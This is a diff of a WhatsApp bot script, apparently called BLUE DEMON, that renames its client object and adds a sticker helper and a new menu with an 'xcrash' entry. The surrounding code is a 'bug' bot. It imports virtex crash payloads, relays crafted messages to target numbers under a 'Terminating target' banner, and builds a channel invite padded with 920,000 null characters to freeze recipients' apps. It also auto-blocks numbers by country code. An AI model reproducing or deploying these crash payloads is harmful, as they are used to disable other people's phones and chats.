@@ -2,7 +2,7 @@
  CREATOR
  @DEMON KING
 */
-module.exports = async (zyn, m, store) => {
+module.exports = async (blue, m, store) => {
     try {
         const from = m.key.remoteJid
         const quoted = m.quoted ? m.quoted : m
@@ -16,12 +16,12 @@ module.exports = async (zyn, m, store) => {
         const axios = require('axios');
         const text = q = args.join(" ")
         const isGroup = from.endsWith('@g.us')
-        const botNumber = await zyn.decodeJid(zyn.user.id)
-        const sender = m.key.fromMe ? (zyn.user.id.split(':')[0] + '@s.whatsapp.net' || zyn.user.id) : (m.key.participant || m.key.remoteJid)
+        const botNumber = await blue.decodeJid(blue.user.id)
+        const sender = m.key.fromMe ? (blue.user.id.split(':')[0] + '@s.whatsapp.net' || blue.user.id) : (m.key.participant || m.key.remoteJid)
         const senderNumber = sender.split('@')[0]
         const pushname = m.pushName || `${senderNumber}`
         const isBot = botNumber.includes(senderNumber)
-        const groupMetadata = isGroup ? await zyn.groupMetadata(m.chat).catch(e => {}) : ''
+        const groupMetadata = isGroup ? await blue.groupMetadata(m.chat).catch(e => {}) : ''
         const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
         const participants = isGroup ? await groupMetadata.participants : ''
         const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
@@ -61,7 +61,7 @@ module.exports = async (zyn, m, store) => {
         const botname = "𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍";
         const bugres = '𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗶𝗻𝗴 𝘁𝗮𝗿𝗴𝗲𝘁...'
         const canvafy = require('canvafy')
-        const currentMode = zyn.public ? 'Public' : 'Private';
+        const currentMode = blue.public ? 'Public' : 'Private';
         // VIRTEX
         const {
             ios
@@ -78,21 +78,19 @@ module.exports = async (zyn, m, store) => {
         const {
             cP
         } = require('./database/virtex/bugUrl.js')
-
-
         // Auto Blocked Nomor +212
-        if (m.sender.startsWith('212')) return zyn.updateBlockStatus(m.sender, 'block')
+        if (m.sender.startsWith('212')) return blue.updateBlockStatus(m.sender, 'block')
         // auto anti bug
         if (global.antibug) {
             if (!isGroup && m.isBaileys && m.fromMe) {
-                await zyn.sendMessage(m.chat, {
+                await blue.sendMessage(m.chat, {
                     delete: {
                         remoteJid: m.chat,
                         fromMe: true,
                         id: m.key.id
                     }
                 })
-                await zyn.sendMessage(`${global.owner}@s.whatsapp.net`, {
+                await blue.sendMessage(`${global.owner}@s.whatsapp.net`, {
                     text: `*BUG MESSAGE DETECTED*
 *Number* ${m.sender.split("@")[0]}`
                 }, {
@@ -100,6 +98,26 @@ module.exports = async (zyn, m, store) => {
                 })
             }
         }
+blue.sendImageAsSticker = async (jid, media, m, options = {}) => {
+    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
+    const getRandom = (ext) => {
+            return `${Math.floor(Math.random() * 10000)}${ext}`
+        }
+    let jancok = new Sticker(media, {
+        pack: global.packname, // The pack name
+        author: global.author, // The author name
+        type: StickerTypes.FULL, // The sticker type
+        categories: ['🤩', '🎉'], // The sticker category
+        id: '12345', // The sticker id
+        quality: 50, // The quality of the output file
+        background: '#FFFFFF00' // The sticker background color (only for full stickers)
+    })
+    let stok = getRandom(".webp")
+    let nono = await jancok.toFile(stok)
+    let nah = fs.readFileSync(nono)
+    await blue.sendMessage(jid,{sticker: nah},{quoted: m})
+    return await fs.unlinkSync(stok)
+     }
         const nanototalpitur = () => {
             var mytext = fs.readFileSync("./demontech.js").toString()
             var numUpper = (mytext.match(/case '/g) || []).length
@@ -154,9 +172,9 @@ module.exports = async (zyn, m, store) => {
             var ucapanWaktu = 'wagwan  👾'
         }
 
-        zyn.autoshalat = zyn.autoshalat ? zyn.autoshalat : {}
+        blue.autoshalat = blue.autoshalat ? blue.autoshalat : {}
         let id = m.chat
-        if (id in zyn.autoshalat) {
+        if (id in blue.autoshalat) {
             return false
         }
         let jadwalSholat = {
@@ -176,8 +194,8 @@ module.exports = async (zyn, m, store) => {
         const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
         for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
             if (timeNow === waktu) {
-                zyn.autoshalat[id] = [
-                    zyn.sendMessage(m.chat, {
+                blue.autoshalat[id] = [
+                    blue.sendMessage(m.chat, {
                         audio: {
                             url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
                         },
@@ -213,13 +231,13 @@ module.exports = async (zyn, m, store) => {
         const isPremium = prem.includes(sender)
         const isOwner = ownerNumber.includes(senderNumber) || isBot
         // BUTTON VIDEO
-        zyn.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
+        blue.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
             var video = await prepareWAMessageMedia({
                 video: {
                     url: opts && opts.video ? opts.video : ''
                 }
             }, {
-                upload: zyn.waUploadToServer
+                upload: blue.waUploadToServer
             })
             let message = generateWAMessageFromContent(jid, {
                 viewOnceMessage: {
@@ -256,8 +274,8 @@ module.exports = async (zyn, m, store) => {
             }, {
                 quoted
             })
-            await zyn.sendPresenceUpdate('composing', jid)
-            return zyn.relayMessage(jid, message["message"], {
+            await blue.sendPresenceUpdate('composing', jid)
+            return blue.relayMessage(jid, message["message"], {
                 messageId: message.key.id
             })
         }
@@ -288,7 +306,7 @@ module.exports = async (zyn, m, store) => {
                 userJid: target
             });
 
-            await zyn.relayMessage(target, qpMessage.message, {
+            await blue.relayMessage(target, qpMessage.message, {
                 participant: {
                     jid: target
                 },
@@ -317,7 +335,7 @@ module.exports = async (zyn, m, store) => {
                 userJid: target
             });
 
-            await zyn.relayMessage(target, sessionStructure.message, {
+            await blue.relayMessage(target, sessionStructure.message, {
                 participant: {
                     jid: target
                 },
@@ -368,7 +386,7 @@ module.exports = async (zyn, m, store) => {
                     }
                 }
             }), {});
-            zyn.relayMessage(LockJids, messageContent.message, {
+            blue.relayMessage(LockJids, messageContent.message, {
                 'messageId': messageContent.key.id
             });
         }
@@ -381,7 +399,7 @@ module.exports = async (zyn, m, store) => {
                             "newsletterJid": `120363298524333143@newsletter`,
                             "newsletterName": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟` " + "\u0000".repeat(920000),
                             "jpegThumbnail": "",
-                            "caption": `Undangan Admin Channel Zynxzo Script`,
+                            "caption": `Undangan Admin Channel bluexzo Script`,
                             "inviteExpiration": Date.now() + 1814400000
                         }
                     }
@@ -389,7 +407,7 @@ module.exports = async (zyn, m, store) => {
             }), {
                 'userJid': LockJids
             });
-            await zyn.relayMessage(LockJids, messageContent.message, {
+            await blue.relayMessage(LockJids, messageContent.message, {
                 'participant': {
                     'jid': LockJids
                 },
@@ -446,11 +464,11 @@ module.exports = async (zyn, m, store) => {
         let list = []
         for (let i of ownerNumber) {
             list.push({
-                displayName: await zyn.getName(i + '@s.whatsapp.net'),
+                displayName: await blue.getName(i + '@s.whatsapp.net'),
                 vcard: `BEGIN:VCARD\n
 VERSION:3.0\n
-N:${await zyn.getName(i + '@s.whatsapp.net')}\n
-FN:${await zyn.getName(i + '@s.whatsapp.net')}\n
+N:${await blue.getName(i + '@s.whatsapp.net')}\n
+FN:${await blue.getName(i + '@s.whatsapp.net')}\n
 item1.TEL;waid=${i}:${i}\n
 item1.X-ABLabel:Ponsel\n
 item2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n
@@ -477,7 +495,7 @@ END:VCARD`
 
         // Gak Usah Di Apa Apain Jika Tidak Mau Error
         try {
-            ppuser = await zyn.profilePictureUrl(m.sender, 'image')
+            ppuser = await blue.profilePictureUrl(m.sender, 'image')
         } catch (err) {
             ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
         }
@@ -570,17 +588,6 @@ END:VCARD`
                 throw 'An error occurred while obtaining Spotify access token.';
             }
         }
-        async function autoViewStatus() {
-            if (autoswview) {
-                // Fetch the list of statuses
-                let statusList = await zyn.fetchStatusUpdates();
-                for (let status of statusList) {
-                    // Automatically view each status
-                    await zyn.readStatus(status.id);
-                }
-            }
-        }
-
         // FUNCTION OBFUSCATOR 
         async function obfus(query) {
             return new Promise((resolve, reject) => {
@@ -608,7 +615,7 @@ END:VCARD`
         }
 
         //Status
-        if (!zyn.public) {
+        if (!blue.public) {
             if (!m.key.fromMe) return
         }
 
@@ -619,12 +626,12 @@ END:VCARD`
             ]
             let {
                 key
-            } = await zyn.sendMessage(from, {
+            } = await blue.sendMessage(from, {
                 text: '𝐑'
             })
 
             for (let i = 0; i < baralod.length; i++) {
-                await zyn.sendMessage(from, {
+                await blue.sendMessage(from, {
                     text: baralod[i],
                     edit: key
                 });
@@ -655,12 +662,12 @@ END:VCARD`
                 userJid: jid,
                 quoted: m
             })
-            zyn.relayMessage(jid, order.message, {
+            blue.relayMessage(jid, order.message, {
                 messageId: order.key.id
             })
         }
         const bluereply = (teks) => {
-            zyn.sendMessage(from, {
+            blue.sendMessage(from, {
                 text: teks
             }, {
                 quoted: m
@@ -668,7 +675,7 @@ END:VCARD`
         }
         // Function Reply
         const reply = (teks) => {
-            zyn.sendMessage(m.chat, {
+            blue.sendMessage(m.chat, {
                 text: teks,
                 contextInfo: {
                     mentionedJid: [sender],
@@ -716,13 +723,13 @@ END:VCARD`
         if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
             if (!isBotAdmins) return
             if (budy.match(`whatsapp.com`)) {
-                zyn.sendMessage(m.chat, {
+                blue.sendMessage(m.chat, {
                     text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`
                 }, {
                     quoted: m
                 })
-                zyn.groupParticipantsUpdate(m.chat, [sender], 'delete')
-                zyn.sendMessage(m.chat, {
+                blue.groupParticipantsUpdate(m.chat, [sender], 'delete')
+                blue.sendMessage(m.chat, {
                     delete: m.key
                 })
             }
@@ -745,6 +752,7 @@ END:VCARD`
          *𝖜𝖍𝖔 𝖉𝖆𝖗𝖊𝖘*
   『〆⑆  *ᴀʟʟᴍᴇɴᴜ* 』
   『〆⑆  *ʙᴜɢᴍᴇɴᴜ* 』
+  『〆⑆  *xᴄʀᴀꜱʜ* 』
   『〆⑆  *ꜱᴘᴇᴄɪᴀʟᴍᴇɴᴜ* 』
   
   
@@ -782,7 +790,7 @@ END:VCARD`
                                     ...(await prepareWAMessageMedia({
                                         image: await fs.readFileSync("./database/image/xbug.jpg")
                                     }, {
-                                        upload: zyn.waUploadToServer
+                                        upload: blue.waUploadToServer
                                     }))
                                 }),
                                 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
@@ -798,10 +806,10 @@ END:VCARD`
                     userJid: m.sender,
                     quoted: m
                 })
-                await zyn.relayMessage(freesex.key.remoteJid, freesex.message, {
+                await blue.relayMessage(freesex.key.remoteJid, freesex.message, {
                     messageId: freesex.key.id
                 })
-                await zyn.sendMessage(m.chat, {
+                await blue.sendMessage(m.chat, {
                     audio: darkphonk,
                     mimetype: 'audio/mp4',
                     ptt: true
@@ -810,6 +818,44 @@ END:VCARD`
                 })
             }
             break
+      case 'menu2': {
+    const darkphonk = fs.readFileSync('./database/Phonk.mp3');
+    const image = fs.readFileSync('./database/image/xbug.jpg');
+    const version = require("baileys/package.json").version;
+
+    const menu2 = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
+┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
+┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
+┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
+┃✾ᐉ 𝐌𝐨𝐝𝐞 : *${currentMode}*
+┃✾ᐉ 𝐓𝐢𝐦𝐞 : *${time2}*
+┗━━━━━━━━━━━━━━━━━━❐
+👾 \`𝕻𝖗𝖔𝖙𝖊𝖈𝖙 𝖙𝖍𝖔𝖘𝖊 𝖞𝖔𝖚 𝖑𝖔𝖛𝖊\` 👾
+
+         *𝖜𝖍𝖔 𝖉𝖆𝖗𝖊𝖘*
+  『〆⑆  *ᴀʟʟᴍᴇɴᴜ* 』
+  『〆⑆  *ʙᴜɢᴍᴇɴᴜ* 』
+  『〆⑆  *xᴄʀᴀꜱʜ* 』
+  『〆⑆  *ꜱᴘᴇᴄɪᴀʟᴍᴇɴᴜ* 』
+  
+> ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴅᴇᴘʟᴏʏɪɴɢ
+> 𝕯𝖊𝖒𝖔𝖒 𝖐𝖎𝖓𝖌 
+`;
+    // Send the image
+    await blue.sendMessage(m.chat, {
+        image: image,
+        caption: menu2
+    });
+
+    // Send the audio as a push-to-talk (PTT) message
+    await blue.sendMessage(m.chat, {
+        audio: darkphonk,
+        mimetype: 'audio/mp4',
+        ptt: true
+    });
+    
+    break;
+}
             case 'bluemenu':
             case 'allmenu': {
                 const version = require("baileys/package.json").version;
@@ -839,8 +885,10 @@ END:VCARD`
 │ ⑄ ᴅᴇʟ
 │ ⑄ ᴊᴏɪɴ
 │ ⑄ ᴄʟᴇᴀʀᴄʜᴀᴛ
+│ ⑄ ꜱᴇᴛɴᴀᴍᴇ
 │ ⑄ ꜱᴇᴛʙɪᴏ
 │ ⑄ ʀᴇꜱᴛᴀʀᴛ
+│ ⑄ ꜱᴇᴛᴘᴘ
 ┗─────────────❐
 
 ┏─『 \`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑𝐒\` 』
@@ -872,6 +920,8 @@ END:VCARD`
 │ ⑄ ʟᴇᴀᴠᴇɢᴄ
 │ ⑄ ᴄʟᴏꜱᴇɢᴄ
 │ ⑄ ᴏᴘᴇɴɢᴄ
+│ ⑄ ꜱᴇᴛᴅᴇꜱᴄ
+│ ⑄ ɢᴇᴛᴘᴘ
 ┗─────────────❐
 
 ┏─『 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 』
@@ -887,7 +937,8 @@ END:VCARD`
 │ ⑄ ɢᴇᴛɪᴘ
 │ ⑄ ᴛᴏᴛᴀʟᴄᴍᴅ
 │ ⑄ ʀᴜɴᴛɪᴍᴇ 
-│ ⑄ ᴛɪᴍᴇ 
+│ ⑄ ᴛɪᴍᴇ
+│ ⑄ ᴇxᴄʜᴀɴɢᴇ 
 ┗─────────────❐
 
 
@@ -931,7 +982,7 @@ END:VCARD`
                                     ...(await prepareWAMessageMedia({
                                         image: await fs.readFileSync("./database/image/xbug.jpg")
                                     }, {
-                                        upload: zyn.waUploadToServer
+                                        upload: blue.waUploadToServer
                                     }))
                                 }),
                                 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
@@ -948,7 +999,7 @@ END:VCARD`
                     quoted: m
                 });
 
-                await zyn.relayMessage(freesex.key.remoteJid, freesex.message, {
+                await blue.relayMessage(freesex.key.remoteJid, freesex.message, {
                     messageId: freesex.key.id
                 });
             }
@@ -1006,7 +1057,7 @@ END:VCARD`
                                     ...(await prepareWAMessageMedia({
                                         image: await fs.readFileSync("./database/image/xbug.jpg")
                                     }, {
-                                        upload: zyn.waUploadToServer
+                                        upload: blue.waUploadToServer
                                     }))
                                 }),
                                 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
@@ -1023,7 +1074,7 @@ END:VCARD`
                     quoted: m
                 });
 
-                await zyn.relayMessage(freesex.key.remoteJid, freesex.message, {
+                await blue.relayMessage(freesex.key.remoteJid, freesex.message, {
                     messageId: freesex.key.id
                 });
             }
@@ -1083,7 +1134,7 @@ END:VCARD`
                                     ...(await prepareWAMessageMedia({
                                         image: await fs.readFileSync("./database/image/xbug.jpg")
                                     }, {
-                                        upload: zyn.waUploadToServer
+                                        upload: blue.waUploadToServer
                                     }))
                                 }),
                                 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
@@ -1100,7 +1151,7 @@ END:VCARD`
                     quoted: m
                 });
 
-                await zyn.relayMessage(freesex.key.remoteJid, freesex.message, {
+                await blue.relayMessage(freesex.key.remoteJid, freesex.message, {
                     messageId: freesex.key.id
                 });
             }
@@ -1109,7 +1160,7 @@ END:VCARD`
                 if (!isOwner) return reply(mess.only.owner);
                 if (!args[0]) return reply(`Usage: ${prefix + command} number\nExample: ${prefix + command} 62×××`);
                 prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`;
-                let ceknya = await zyn.onWhatsApp(prrkek);
+                let ceknya = await blue.onWhatsApp(prrkek);
                 if (ceknya.length == 0) return reply(`Enter a valid number registered on WhatsApp!`);
                 prem.push(prrkek);
                 fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem));
@@ -1130,7 +1181,7 @@ END:VCARD`
                 if (!isOwner) return reply(mess.only.owner)
                 if (!args[0]) return reply(`Usage ${prefix+command} number\nExample ${prefix+command} 62×××`)
                 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
-                let ceknye = await zyn.onWhatsApp(bnnd + `@s.whatsapp.net`)
+                let ceknye = await blue.onWhatsApp(bnnd + `@s.whatsapp.net`)
                 if (ceknye.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
                 ownerNumber.push(bnnd)
                 fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
@@ -1151,8 +1202,8 @@ END:VCARD`
             case 'gruplink': {
                 if (!m.isGroup) return reply(mess.only.group);
                 try {
-                    let response = await zyn.groupInviteCode(m.chat);
-                    let groupMetadata = await zyn.groupMetadata(m.chat);
+                    let response = await blue.groupInviteCode(m.chat);
+                    let groupMetadata = await blue.groupMetadata(m.chat);
 
                     let groupInfo = `👥 *GROUP LINK*\n` +
                         `📛 *Name :* ${groupMetadata.subject}\n` +
@@ -1161,7 +1212,7 @@ END:VCARD`
                         `🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n` +
                         `👥 *Member :* ${groupMetadata.participants.length}\n`;
 
-                    await zyn.sendText(m.chat, groupInfo, m);
+                    await blue.sendText(m.chat, groupInfo, m);
                 } catch (error) {
                     console.error('Error fetching group link:', error);
                     return reply('Failed to retrieve the group link.');
@@ -1192,7 +1243,7 @@ END:VCARD`
                     }
 
                     // Block the user
-                    await zyn.updateBlockStatus(users, "block");
+                    await blue.updateBlockStatus(users, "block");
                     bluereply(mess.success);
                 } else {
                     reply("Please reply to the message or input the number you want to block.");
@@ -1203,7 +1254,7 @@ END:VCARD`
             case 'clear': {
                 if (!isOwner) return bluereply(mess.only.owner);
 
-                zyn.chatModify({
+                blue.chatModify({
                         delete: true,
                         lastMessages: [{
                             key: m.key,
@@ -1261,7 +1312,7 @@ END:VCARD`
                     `*Total: ${premiumList.length}*`;
 
                 // Send the message
-                await zyn.sendText(m.chat, premiumMessage, m);
+                await blue.sendText(m.chat, premiumMessage, m);
                 break;
             }
             case "delowner":
@@ -1275,13 +1326,13 @@ END:VCARD`
                 break
             case 'public': {
                 if (!isOwner) return reply(mess.only.owner)
-                zyn.public = true
+                blue.public = true
                 reply(' *\`Public mode activated\`* ')
             }
             break
             case 'self': {
                 if (!isOwner) return reply(mess.only.owner)
-                zyn.public = false
+                blue.public = false
                 reply(' *\`Private mode activated\`* ')
             }
             break
@@ -1290,7 +1341,7 @@ END:VCARD`
                 const startTime = performance.now();
 
                 // Send a preliminary message to notify that the ping is being measured
-                const pingMsg = await zyn.sendMessage(m.chat, {
+                const pingMsg = await blue.sendMessage(m.chat, {
                     text: '𝐑𝐞𝐚𝐝𝐢𝐧𝐠 𝐩𝐢𝐧𝐠 ⫸'
                 });
 
@@ -1299,7 +1350,7 @@ END:VCARD`
                 const latensi = (endTime - startTime).toFixed(3); // Calculate the latency in milliseconds
 
                 // Relay an edited message with the calculated ping
-                await zyn.relayMessage(m.chat, {
+                await blue.relayMessage(m.chat, {
                     protocolMessage: {
                         key: pingMsg.key,
                         type: 14, // Protocol type for editing messages
@@ -1330,7 +1381,7 @@ END:VCARD`
                     }
 
                     // Unblock the user
-                    await zyn.updateBlockStatus(users, "unblock");
+                    await blue.updateBlockStatus(users, "unblock");
                     reply(`Successfully unblocked user ${users.split("@")[0]}`);
                 } else {
                     reply("Please reply to the message or input the number you want to unblock.");
@@ -1343,14 +1394,14 @@ END:VCARD`
 
                 // Toggle between public and private modes
                 if (q === 'public') {
-                    zyn.public = true; // Set to public mode
+                    blue.public = true; // Set to public mode
                     reply("*[sᴜᴄᴄᴇss]* *ᴩᴜʙʟɪᴄ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ😊*");
                 } else if (q === 'self' || q === 'private') {
-                    zyn.public = false; // Set to private mode
+                    blue.public = false; // Set to private mode
                     reply("*[sᴜᴄᴄᴇss]* *ᴩʀɪᴠᴀᴛᴇ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ😊*");
                 } else {
                     // Display current mode
-                    let currentMode = zyn.public ? 'ᴩᴜʙʟɪᴄ' : 'ᴩʀɪᴠᴀᴛᴇ';
+                    let currentMode = blue.public ? 'ᴩᴜʙʟɪᴄ' : 'ᴩʀɪᴠᴀᴛᴇ';
                     reply(`*ᴛʜᴇ ʙᴏᴛ ɪꜱ ᴄᴜʀʀᴇɴᴛʟy ɪɴ ${currentMode} ᴍᴏᴅᴇ*`);
                 }
             }
@@ -1362,7 +1413,7 @@ END:VCARD`
                 if (!m.quoted) return; // Exit if there is no quoted message
 
                 try {
-                    await zyn.sendMessage(m.chat, {
+                    await blue.sendMessage(m.chat, {
                         delete: {
                             remoteJid: m.chat,
                             fromMe: false, // This is set to false to delete others' messages
@@ -1384,7 +1435,7 @@ END:VCARD`
                 bluereply(mess.wait);
 
                 try {
-                    await zyn.groupAcceptInvite(result);
+                    await blue.groupAcceptInvite(result);
                     bluereply(mess.success);
                 } catch (error) {
                     // Handle different error responses
@@ -1413,8 +1464,8 @@ END:VCARD`
                 if (!isOwner) return reply(mess.only.owner);
                 if (!q) return reply(`*TEXT*`);
 
-                // Sets bot bio/status using zyn
-                await zyn.updateProfileStatus(q);
+                // Sets bot bio/status using blue
+                await blue.updateProfileStatus(q);
                 reply(`*Bio has been changed to ${q}*`);
             }
             break;
@@ -1435,7 +1486,7 @@ END:VCARD`
 
 \`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname}\`
 `;
-                    zyn.sendMessage(m.chat, {
+                    blue.sendMessage(m.chat, {
                         caption: caption,
                         video: {
                             url: vidnya
@@ -1455,7 +1506,7 @@ END:VCARD`
 
 \`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname}\`
         `;
-                    zyn.sendMessage(m.chat, {
+                    blue.sendMessage(m.chat, {
                         caption: caption,
                         video: {
                             url: videoUrl
@@ -1475,7 +1526,7 @@ END:VCARD`
                     const data = await fetchJson(`https://widipe.com/download/fbdl?url=${encodeURIComponent(text)}`)
                     const tex = `*[ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname} ]*`;
                     const videoBuffer = data.result.HD;
-                    zyn.sendMessage(m.chat, {
+                    blue.sendMessage(m.chat, {
                         caption: tex,
                         video: {
                             url: videoBuffer
@@ -1502,7 +1553,7 @@ END:VCARD`
                     if (data && data.result && data.result.length > 0 && data.result[0].url) {
                         const hasil = data.result[0].url;
                         const cap = `𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname}`;
-                        zyn.sendMessage(m.chat, {
+                        blue.sendMessage(m.chat, {
                             video: {
                                 url: hasil
                             },
@@ -1531,7 +1582,7 @@ END:VCARD`
                     teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`;
                 }
 
-                zyn.sendMessage(m.chat, {
+                blue.sendMessage(m.chat, {
                     image: {
                         url: search.all[0].thumbnail
                     },
@@ -1591,7 +1642,7 @@ END:VCARD`
                 }, {
                     quoted: m
                 }, {});
-                await zyn.relayMessage(msg.key.remoteJid, msg.message, {
+                await blue.relayMessage(msg.key.remoteJid, msg.message, {
                     messageId: msg.key.id
                 });
             }
@@ -1611,13 +1662,13 @@ END:VCARD`
                     .setBlur(3)
                     .build();
 
-                await zyn.sendMessage(from, {
+                await blue.sendMessage(from, {
                     image: p,
                     caption: captionvid
                 }, {
                     quoted: m
                 })
-                zyn.sendMessage(m.chat, {
+                blue.sendMessage(m.chat, {
                     audio: {
                         url: result.download
                     },
@@ -1640,7 +1691,7 @@ END:VCARD`
   *title* ${proces.result.title}
   
   ©${botname}`;
-                    zyn.sendMessage(m.chat, {
+                    blue.sendMessage(m.chat, {
                         video: {
                             url: video4
                         },
@@ -1673,7 +1724,7 @@ END:VCARD`
                     const headerMedia = await prepareWAMessageMedia({
                         image: fs.readFileSync('./database/image/xbug.jpg')
                     }, {
-                        upload: zyn.waUploadToServer
+                        upload: blue.waUploadToServer
                     });
 
                     // Create interactive message
@@ -1720,7 +1771,7 @@ END:VCARD`
                     const msgs = generateWAMessageFromContent(m.chat, interactiveMessage, {
                         quoted: m
                     });
-                    await zyn.relayMessage(m.chat, msgs.message, {
+                    await blue.relayMessage(m.chat, msgs.message, {
                         messageId: msgs.key.id
                     });
 
@@ -1743,7 +1794,7 @@ END:VCARD`
 
                     const newFileContent = await response.text();
 
-                    // Update the zyn file
+                    // Update the blue file
                     const fs = require('fs');
                     fs.writeFileSync('./demontech.js', newFileContent, 'utf8');
 
@@ -1759,7 +1810,7 @@ END:VCARD`
                 if (!m.isGroup) return reply(mess.only.group);
                 bluereply(mess.wait);
                 try {
-                    const groupMetadata = await zyn.groupMetadata(m.chat);
+                    const groupMetadata = await blue.groupMetadata(m.chat);
                     const participants = groupMetadata.participants;
 
                     // Create VCF file content
@@ -1777,7 +1828,7 @@ END:VCARD`
                     fs.writeFileSync(filePath, vcfContent);
 
                     // Send the VCF file to the group
-                    await zyn.sendMessage(m.chat, {
+                    await blue.sendMessage(m.chat, {
                         document: fs.readFileSync(filePath),
                         fileName: fileName,
                         mimetype: 'text/vcard',
@@ -1797,7 +1848,7 @@ END:VCARD`
                 if (!m.isGroup) return reply(mess.only.group);
 
                 // Check if the user is an admin, group owner, bot owner, or premium user
-                if (!isOwner && !isPremium) {
+                if (!isAdmins && !isPremium) {
                     return reply(mess.only.owner);
                 }
 
@@ -1812,7 +1863,7 @@ END:VCARD`
                 }
 
                 // Send the message tagging all participants
-                await zyn.sendMessage(m.chat, {
+                await blue.sendMessage(m.chat, {
                     text: quotedMessage,
                     mentions: participants.map(a => a.id) // Tag all participants
                 });
@@ -1821,35 +1872,32 @@ END:VCARD`
             }
             case 'tagall': {
                 if (!m.isGroup) return reply(mess.only.group);
-                if (!isOwner && !isAdmin) return reply(mess.only.admin);
-
-                // Check if the sender is the owner
-                if (!isOwner) return reply(mess.only.owner);
+                if (!isOwner && !isAdmins) return reply(mess.only.admin);
 
                 // Send a preliminary "Tagging all participants, please wait..." message
                 await bluereply(mess.wait);
 
                 // Get group metadata to access participants
-                const groupMetadata = await zyn.groupMetadata(m.chat);
+                const groupMetadata = await blue.groupMetadata(m.chat);
                 const participants = groupMetadata.participants;
 
                 // Map participants to their IDs for proper tagging
                 const mentions = participants.map(p => p.id);
 
                 // Create a list of participants to display in the message
-                let participantsList = participants.map(participant => `💕 @${participant.id.split('@')[0]}`).join('\n');
+                let participantsList = participants.map(participant => `${themeemoji} @${participant.id.split('@')[0]}`).join('\n');
 
-                let message = `\`ʙʟᴜᴇᴅᴇᴍᴏɴ ꜱᴜᴍᴍᴏɴꜱ yᴏᴜ ᴀʟʟ💕\`:\n\n${participantsList}`;
+                let message = `*👾\`ʙʟᴜᴇᴅᴇᴍᴏɴ ꜱᴜᴍᴍᴏɴꜱ yᴏᴜ ᴀʟʟ\`👾*:\n\n${participantsList}`;
 
                 // Send the actual tag message with mentions
-                await zyn.sendMessage(m.chat, {
+                await blue.sendMessage(m.chat, {
                     text: message,
                     mentions: mentions
                 });
 
                 // Send a confirmation message
-                await zyn.sendMessage(m.chat, {
-                    text: '𝐁𝐋𝐔𝐄𝐃𝐄𝐌𝐎𝐍 𝐓𝐄𝐂𝐇 🤟`'
+                await blue.sendMessage(m.chat, {
+                    text: '𝐁𝐋𝐔𝐄𝐃𝐄𝐌𝐎𝐍 𝐓𝐄𝐂𝐇 🤟'
                 });
             }
             break;
@@ -1868,7 +1916,7 @@ END:VCARD`
 
                 try {
                     // Attempt to add the user to the group
-                    await zyn.groupParticipantsUpdate(m.chat, [userToAdd], 'add');
+                    await blue.groupParticipantsUpdate(m.chat, [userToAdd], 'add');
                     bluereply(mess.success);
                 } catch (err) {
                     // Handle potential errors
@@ -1880,7 +1928,7 @@ END:VCARD`
             case "kick": {
                 if (!isGroup) return reply(mess.only.group);
 
-                if (!isAdmins && !isOwner) return reply(mess.only.admin);
+                if (!isAdmins && !isOwner && !isPremium) return reply(mess.only.admin);
 
                 if (!isBotAdmins) return reply(mess.only.badmin);
 
@@ -1889,7 +1937,7 @@ END:VCARD`
 
                 try {
                     // Attempt to remove the user from the group
-                    await zyn.groupParticipantsUpdate(m.chat, [users], 'remove');
+                    await blue.groupParticipantsUpdate(m.chat, [users], 'remove');
                     reply('User successfully removed from the group.');
                 } catch (err) {
                     // Handle potential errors
@@ -1909,7 +1957,7 @@ END:VCARD`
 
                 try {
                     // Attempt to promote the user to admin
